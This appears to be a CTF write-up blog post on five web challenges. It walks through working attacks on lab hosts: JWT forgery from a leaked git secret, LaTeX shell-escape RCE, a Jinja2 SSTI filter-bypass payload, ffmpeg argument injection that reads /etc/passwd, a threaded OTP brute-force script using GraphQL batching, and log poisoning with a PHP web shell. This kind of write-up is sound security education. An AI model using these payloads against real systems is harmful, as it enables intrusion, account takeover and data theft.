@@ -1,0 +1,453 @@
+---
+layout: post
+title:  "Web Challenges"
+date:   2026-09-28 16:55:00 -0400
+author: uzi
+tags: [CTF]
+permalink: /h7-ctf-2026-web/
+---
+* TOC
+{:toc}
+
+## WorldOutter
+
+**Category**: web
+
+**Author**: WebVerse (Leighlin Ramsay) x H7
+
+**Description**: WorldOutter is a fantasy football platform where friends run a league: set your lineup, check the standings, follow the weekly scoreboard. Only the league commissioner can open the settings console.
+
+Going to the website:
+
+![Alt text](/images/h7web1.png)
+
+I find these endpoints:
+```shell
+/league
+/scores
+/commissioner
+/players
+```
+`robots.txt` existed but contained nothing interesting.
+
+`/commissioner` is the endpoint I need access to. It currently returns a `403`:
+
+![Alt text](/images/h7web2.png)
+
+Eventually I found `/.git/HEAD` and downloaded the entire repo:
+```shell
+./gitdumper.sh https://8706958d-5793-worldoutter-4ef44.mystery-challenges.webverselabs-pro.com/.git/ gitdumped  
+###########  
+# GitDumper is part of https://github.com/internetwache/GitTools  
+#  
+# Developed and maintained by @gehaxelt from @internetwache  
+#  
+# Use at your own risk. Usage might be illegal in certain circumstances.  
+# Only for educational purposes!  
+###########  
+  
+  
+[*] Destination folder does not exist  
+[+] Creating gitdumped/.git/  
+[+] Downloaded: HEAD  
+[+] Downloaded: objects/info/packs  
+[+] Downloaded: description  
+[+] Downloaded: config  
+[+] Downloaded: COMMIT_EDITMSG  
+[+] Downloaded: index  
+[-] Downloaded: packed-refs  
+[-] Downloaded: refs/heads/master  
+[+] Downloaded: refs/heads/main  
+[-] Downloaded: refs/remotes/origin/HEAD  
+[-] Downloaded: refs/stash  
+[+] Downloaded: logs/HEAD  
+[-] Downloaded: logs/refs/heads/master  
+[+] Downloaded: logs/refs/heads/main  
+[-] Downloaded: logs/refs/remotes/origin/HEAD  
+[+] Downloaded: info/refs  
+[+] Downloaded: info/exclude  
+[-] Downloaded: /refs/wip/index/refs/heads/master  
+[-] Downloaded: /refs/wip/index/refs/heads/main  
+[-] Downloaded: /refs/wip/wtree/refs/heads/master  
+[-] Downloaded: /refs/wip/wtree/refs/heads/main  
+[+] Downloaded: objects/28/2d58d20a69f53e606166ca95f49a766deb6ed6  
+[-] Downloaded: objects/00/00000000000000000000000000000000000000  
+[+] Downloaded: objects/d4/bb5274e246b49a082025d1cb59938068bc995b  
+[+] Downloaded: objects/e7/8bd8685d55257e03865325f43ff1f6988c5ac7  
+[+] Downloaded: objects/31/8cbb6185ce1299343a92ff800f4519f6e9d4de  
+[+] Downloaded: objects/b5/44a7b93d2777c7fb68676cc313d3e5cbbaad76  
+[+] Downloaded: objects/3c/bdbeaab478e0e60d6ce8907df9b34411ceb4f6  
+[+] Downloaded: objects/a1/70e0096347c40b569e0bce5aa7849e439ae5c2  
+[+] Downloaded: objects/5f/6877003ca5299fba79671e2f59467485ba8035  
+[+] Downloaded: objects/0b/7202628ed321f4d2ef4b3002849dc5bfdc744a
+```
+
+In the repo I located a jwt secret (along with the rest of the source code!):
+```shell
+git show 282d58d20a69f53e606166ca95f49a766deb6ed6 | head -n 28  
+commit 282d58d20a69f53e606166ca95f49a766deb6ed6  
+Author: WorldOutter Deploy <dev@worldoutter.example>  
+Date:   Tue Jun 2 11:00:00 2026 +0000  
+  
+    Deploy WorldOutter league app  
+  
+diff --git a/.gitignore b/.gitignore  
+new file mode 100644  
+index 0000000..e78bd86  
+--- /dev/null  
++++ b/.gitignore  
+@@ -0,0 +1,5 @@  
++node_modules/  
++.env  
++*.log  
++npm-debug.log*  
++.DS_Store  
+diff --git a/config/secret.js b/config/secret.js  
+new file mode 100644  
+index 0000000..5f68770  
+--- /dev/null  
++++ b/config/secret.js  
+@@ -0,0 +1,3 @@  
++// Session signing secret for WorldOutter league auth.  
++// TODO(dev): pull this from a real secret manager before we scale.  
++module.exports = { JWT_SECRET: 'af0766737d3606e876f31a0ecab6ef62' };
+diff --git a/package.json b/package.json  
+new file mode 100644
+```
+
+Now that I have the jwt secret I can forge a jwt that looks like this:
+```shell
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+{
+  "user": "you",
+  "team": "Gridiron Gophers",
+  "role": "commissioner",
+  "iat": 1790401463
+}
+```
+
+Once I update my cookie on the page I can access `/commissioner`:
+
+![Alt text](/images/h7web3.png)
+
+`WEBVERSE{dd0ca4d36d55cbec6cc945268cee41cf}`
+
+___
+
+## Justified
+
+**Category**: web
+
+**Author**: WebVerse (Leighlin Ramsay) x H7
+
+**Description**: Marlowe & Sons have hardbound theses for the university since 1968. Their new Instant Cover Proof tool typesets your title page from the details you enter and hands back a PDF, along with the typesetter's log the press operators read before a run. Enter your thesis details, set a proof, and read what the typesetter reports back.
+
+Going to the website:
+
+![Alt text](/images/h7web4.png)
+
+Checking `robots.txt`:
+```shell
+curl https://2e1c016d-5793-justified-d4db7.mystery-challenges.webverselabs-pro.com/robots.txt  
+User-agent: *  
+Allow: /$  
+Allow: /services.php  
+Allow: /pricing.php  
+Allow: /faq.php  
+Allow: /about.php  
+Allow: /contact.php  
+Disallow: /proof.php  
+Disallow: /proof-pdf.php  
+Disallow: /includes/  
+Disallow: /templates/  
+  
+Sitemap: /sitemap.xml
+```
+
+On `/proof.php` I can see they are taking some user input and using `pdflatex` to make pdfs:
+
+![Alt text](/images/h7web5.png)
+
+I made a few test pdfs. In the log output I saw this line:
+```shell
+\write18 enabled
+```
+This means latexs shell escape feature is active! This allows for arbitrary system commands to be executed during PDF compilation. 
+
+[https://tex.stackexchange.com/questions/20444/what-are-immediate-write18-and-how-does-one-use-them](https://tex.stackexchange.com/questions/20444/what-are-immediate-write18-and-how-does-one-use-them)
+
+By sending `\immediate\write18{id}` as the "Abstract" I confirm RCE:
+
+![Alt text](/images/h7web6.png)
+
+```shell
+id > uid=1131(marlowe) gid=1131(marlowe) groups=1131(marlowe)
+```
+
+I got the flag with:
+```shell
+\immediate\write18{cat /flag.txt}
+```
+
+`WEBVERSE{f2229675e94dfa8c805ac5b6248bacbb}`
+
+___
+
+## Merged
+{% raw %}
+**Category**: web
+
+**Author**: WebVerse (Leighlin Ramsay) x H7
+
+**Description**: Certmarq is a course-certificate platform: design a certificate once, merge in your learners, and issue verifiable copies when they finish. The template designer renders each certificate on Certmarq's own servers so issuers can preview exactly how a learner's copy will look before sending it. It trusts the designer a little more than it should.
+
+Going to the site:
+
+![Alt text](/images/h7web7.png)
+
+On `/designer` I see I can design a certificate:
+
+![Alt text](/images/h7web8.png)
+
+By testing with `<p> {{7*'7'}} </p>` I can confirm SSTI via Jinja2:
+
+![Alt text](/images/h7web9.png)
+
+After some testing I found that they blocked `__`. I got payload to work:
+```shell
+<p> {{ cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }} </p>
+```
+`\x5f` is the hex escape for `_`.
+
+![Alt text](/images/h7web10.png)
+
+The flag was in `/flag.txt`
+
+`WEBVERSE{3c5f65f4e05204730d0df2583b6f5c06}`
+
+___
+
+## Splice
+
+**Category**: web
+
+**Author**: WebVerse (Leighlin Ramsay) x H7
+
+**Description**: Tapedeck is an independent podcast host. Its Studio turns an uploaded clip into a shareable audiogram, a waveform poster you can download and post. Open the Studio, upload a clip, name your export, and render. Have a look at how the render names and produces the files it hands back.
+
+Looking at the site:
+
+![Alt text](/images/h7web11.png)
+
+I uploaded a sample audio. It made a POST request to `/studio/upload`. 
+
+When I click `Render audiogram` it renders an image of the waveform of my audio with `ffmpeg`. It makes a POST request to `/api/render`. When I cause an error in the request it outputs an error message from `ffmpeg`:
+```shell
+HTTP/2 200 OK
+Date: Sat, 26 Sep 2026 08:25:29 GMT
+Content-Type: application/json; charset=utf-8
+Server: cloudflare
+Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
+X-Powered-By: Express
+Etag: W/"9c9-v1ArI16IqK167PK+FkEs2ZQRzgg"
+X-Frame-Options: SAMEORIGIN
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Alt-Svc: h3=":443"; ma=86400
+
+{"ok":false,"outputs":[],"errors":"ffmpeg exited with code 1\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libsvtav1 --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --enable-opengl --enable-sdl2 --disable-sndio --enable-libjxl --enable-pocketsphinx --enable-librsvg --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-libplacebo --enable-librav1e --enable-shared\n  libavutil      57. 28.100 / 57. 28.100\n  libavcodec     59. 37.100 / 59. 37.100\n  libavformat    59. 27.100 / 59. 27.100\n  libavdevice    59.  7.100 / 59.  7.100\n  libavfilter     8. 44.100 /  8. 44.100\n  libswscale      6.  7.100 /  6.  7.100\n  libswresample   4.  7.100 /  4.  7.100\n  libpostproc    56.  6.100 / 56.  6.100\nInput #0, mp3, from '/opt/app/media/29066752ed94a6ec/source.mp3':\n  Metadata:\n    encoder         : Lavf57.83.100\n  Duration: 00:00:03.24, start: 0.025057, bitrate: 128 kb/s\n  Stream #0:0: Audio: mp3, 44100 Hz, stereo, fltp, 128 kb/s\n    Metadata:\n      encoder         : Lavc57.10\nInput #1, lavfi, from 'color=c=0x14181c:s=1200x675':\n  Duration: N/A, start: 0.000000, bitrate: N/A\n  Stream #1:0: Video: rawvideo (I420 / 0x30323449), yuv420p, 1200x674 [SAR 1:1 DAR 600:337], 25 tbr, 25 tbn\n[NULL @ 0x5c9cd73da980] Unable to find a suitable output format for 'audiogram'\naudiogram: Invalid argument"}
+```
+
+The normal request sent data like this:
+```shell
+{"slug":"audiogram","theme":"midnight"}
+```
+
+The server builds the ffmpeg command by concatenating the `slug` into a string and splitting on whitespace to build the argv array. Every space separated word in the payload will become its own separate ffmpeg CLI flag. 
+
+I will need to try to render 2 images (one will be a `.png`, one will be the raw bytes of a file). Starting the payload with `waveform.png` satisfies the templates normal `-map [outv] <output>` expectation. ffmgpe lets you declare multiple `-i` inputs and multiple outputs in one invocation. 
+
+I sent this:
+```shell
+{"slug":"waveform.png -f rawvideo -pixel_format gray -video_size 1x1 -i /etc/passwd -map 2:0 -f rawvideo /opt/app/media/29066752ed94a6ec/leak2","theme":"midnight"}
+```
+ffmpeg treats `/etc/passwd` as a 1 by 1 grayscale raw video. This means every byte of the file is one "pixel". Then `-f rawvideo` on the output writes those bytes back exactly. `-map 2:0` = stream 0 of input 2. I got `/opt/app/media/29066752ed94a6ec/source.mp3` from the ffmpeg error. 
+
+Response:
+```shell
+HTTP/2 200 OK
+Date: Sat, 26 Sep 2026 09:07:46 GMT
+Content-Type: application/json; charset=utf-8
+Server: cloudflare
+Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
+X-Powered-By: Express
+Etag: W/"a1-6gZGYYotAQl0qp5AFbusngXECvY"
+X-Frame-Options: SAMEORIGIN
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Alt-Svc: h3=":443"; ma=86400
+
+{"ok":true,"outputs":[{"file":"leak2.png","url":"/m/29066752ed94a6ec/leak2.png"},{"file":"waveform.png","url":"/m/29066752ed94a6ec/waveform.png"}],"errors":null}
+```
+
+curl the image directly:
+```shell
+curl -v -H 'Cookie: cookies' https://6d3305dd-5793-splice-1d18e.mystery-challenges.webverselabs-pro.com/m/29066752ed94a6ec/leak2.png -o leak.raw
+
+cat leak.raw  
+root:x:0:0:root:/root:/bin/bash  
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
+bin:x:2:2:bin:/bin:/usr/sbin/nologin  
+sys:x:3:3:sys:/dev:/usr/sbin/nologin  
+sync:x:4:65534:sync:/bin:/bin/sync  
+games:x:5:60:games:/usr/games:/usr/sbin/nologin  
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
+node:x:1000:1000::/home/node:/bin/bash  
+deck:x:1100:1100::/home/deck:/bin/bash
+```
+It worked!
+
+I sent this to get the flag:
+```shell
+{"slug":"waveform.png -f rawvideo -pixel_format gray -video_size 1x1 -i /flag.txt -map 2:0 -f rawvideo /opt/app/media/29066752ed94a6ec/leak3","theme":"midnight"}
+```
+
+`WEBVERSE{565c05266969b05f7decea269997236b}`
+
+___
+
+## BartBrack
+
+**Category**: web
+
+**Author**: WebVerse (Leighlin Ramsay) x H7
+
+**Description**: Flux is a modern business neobank: one login, two-step verification, and a clean dashboard of balances, transactions, cards, and statements.
+
+Going to the site:
+
+![Alt text](/images/h7web12.png)
+
+I eventually guessed the credentials `admin:admin`:
+
+![Alt text](/images/h7web13.png)
+
+The otp is a 5 digit value from `00000` through `99999`. From what I could tell, the otp is global/static for a period, rather than regenerated per login/session. Making a guess for the otp sends a POST request to `/graphql.php`. I am able to bypass the two factor authentication by using graphql alias batching accross 8 different sessions, and brute forcing ~15,000 guesses per login. Over 15,000 gets you locked out. I ran this script:
+```python
+import requests, sys, threading, queue
+
+HOST="https://3a863ed5-5793-bartbrack-0e073.mystery-challenges.webverselabs-pro.com"
+HOSTNAME="3a863ed5-5793-bartbrack-0e073.mystery-challenges.webverselabs-pro.com"
+CF="<cf_clearance cookie>"
+
+CHUNK=100
+RANGE_PER_SESSION=14000   # stay under 15k
+found = threading.Event()
+lock = threading.Lock()
+
+def fresh():
+    s=requests.Session()
+    s.headers["User-Agent"]="Mozilla/5.0"
+    s.cookies.set("cf_clearance", CF, domain=HOSTNAME)
+    s.post(HOST+"/", data={"username":"admin","password":"admin"})
+    return s
+
+def worker(start):
+    if found.is_set(): return
+    s=fresh()
+    sid=s.cookies.get("flux_sid")
+    end=min(start+RANGE_PER_SESSION, 100000)
+    print(f"[w] {sid} range {start}-{end}")
+    lo=start
+    while lo<end and not found.is_set():
+        codes=[f"{i:05d}" for i in range(lo, min(lo+CHUNK, end))]
+        q="mutation{"+" ".join(f'c{c}:verifyOtp(code:"{c}"){{ok token}}' for c in codes)+"}"
+        try: r=s.post(HOST+"/graphql.php", json={"query":q}, timeout=30)
+        except Exception as e: print("err",lo,e); return
+        t=r.text
+        if "locked" in t.lower():
+            print(f"[w] {sid} locked at {lo}"); return
+        if "Sign in first" in t:
+            print(f"[w] {sid} nosess at {lo}"); return
+        try: d=r.json().get("data") or {}
+        except: lo+=CHUNK; continue
+        for k,v in d.items():
+            if v and v.get("ok"):
+                with lock:
+                    if not found.is_set():
+                        found.set()
+                        print(f"Found code={k[1:]}  flux_sid={sid}")
+                        print(f"response={v}")
+                return
+        lo+=CHUNK
+
+threads=[]
+start=0
+while start<100000:
+    t=threading.Thread(target=worker, args=(start,), daemon=True)
+    t.start(); threads.append(t)
+    start+=RANGE_PER_SESSION
+
+for t in threads: t.join()
+if not found.is_set(): print("nothing")
+```
+The script uses graphql alias batching, letting one query contain many independent mutation calls. The server executes them all in a single request so the per session lock counts one request but graphql processes 100 guesses.
+
+Eventually one of the sessions logs in, and I am able to log in:
+```shell
+python3 graphbrute.py  
+[w] e38ce531411496236c1af1fca99d28cd range 14000-28000  
+[w] 55be1e02bd92c629e490de7e51194e15 range 70000-84000  
+[w] 9d984f8c7356e7fe0cf1600a49e8300e range 56000-70000  
+[w] 77451263b7b7e9b673eb74cfed361f4d range 98000-100000  
+[w] 724a7cea6e3baff3acf75200512d2f0a range 28000-42000  
+[w] cfc38c22f5a76954f5d7e4c5ef616c96 range 42000-56000  
+[w] 87cf2cdd1d50ac2ddb2bf2456ac4749c range 84000-98000  
+[w] b016fc394ef13bf9f920813ce9fecb06 range 0-14000  
+Found code=19066  flux_sid=e38ce531411496236c1af1fca99d28cd  
+response={'ok': True, 'token': '31c5f921117437a8646df0465d1f83b4'}
+```
+
+Once I login I am on `https://3a863ed5-5793-bartbrack-0e073.mystery-challenges.webverselabs-pro.com/dashboard.php`:
+
+![Alt text](/images/h7web14.png)
+
+Eventually I found I could access the apache access log here:
+```shell
+https://3a863ed5-5793-bartbrack-0e073.mystery-challenges.webverselabs-pro.com/dashboard.php?directive=dashboard-pages/../../../../../var/log/apache2/access.log
+```
+
+![Alt text](/images/h7web15.png)
+
+Poison the apache access log with a php payload by making this request (the `User-Agent` gets placed into the access log):
+```shell
+curl "https://3a863ed5-5793-bartbrack-0e073.mystery-challenges.webverselabs-pro.com/zzz-$(date +%s)" -A "<?php system(\$_GET['c']); ?>"
+```
+
+Now I can visit this link:
+```shell
+https://3a863ed5-5793-bartbrack-0e073.mystery-challenges.webverselabs-pro.com/dashboard.php?directive=dashboard-pages/../../../../../var/log/apache2/access.log&c=id
+```
+
+I have RCE:
+```shell
+uid=1310(gilbert) gid=1310(gilbert) groups=1310(gilbert)
+```
+{% endraw %}
+I had to do those steps around 8 times because I kept breaking the shell accidentally. I couldnt find the flag on the filesystem :(
+
+I checked all of the `.php` files. I ran `la -la` all over, `env`, `cat /proc/self/mountinfo`, etc etc. I looked for a long time. Maybe I need to do privilege escalation or lateral movement? I didnt get the flag :( but I got RCE so I'm including it because it was interesting. 
